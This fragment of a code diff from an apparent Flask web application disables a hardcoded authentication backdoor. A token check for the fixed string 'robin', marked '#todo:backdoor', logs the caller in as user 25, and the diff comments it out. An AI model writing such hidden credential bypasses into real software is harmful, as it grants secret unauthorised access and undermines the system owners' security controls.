@@ -230,11 +230,10 @@ auth = HTTPTokenAuth(scheme='Token')
 
 @auth.verify_token
 def verify_token(token):
-    #todo:backdoor
-    if  token=='robin':
-        user = User.query.filter_by(id=25).first()
-        g.user = user
-        return True
+    # if  token=='robin':
+    #     user = User.query.filter_by(id=25).first()
+    #     g.user = user
+    #     return True
     # admin帐户
     # if token == ADMIN_KEY:
     #     return True
